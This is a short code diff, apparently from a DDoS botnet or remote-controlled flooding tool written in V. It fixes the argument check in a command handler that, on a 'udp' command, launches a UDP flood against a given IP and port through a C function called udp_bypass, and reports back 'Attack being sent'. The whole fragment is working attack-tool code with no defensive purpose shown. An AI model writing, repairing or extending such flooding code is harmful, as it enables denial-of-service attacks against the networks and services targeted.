@@ -37,13 +37,12 @@ fn server(ip string, port string, pw string) {
 			match cmd {
 				"udp" {
 					if args.len < 4 {
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+					} else {
 						println("here")
 						server.write_string("[ + ] Attack being sent....\n") or { 0 }
-						mut g := c'${args[1]}'
-						C.udp_bypass(g, args[2].u16(), args[3].int())
+						C.udp_bypass(&char(args[1].str), args[2].u16(), args[3].int())
 						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
-					} else {
-						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
 					}
 				} else {}
 			}
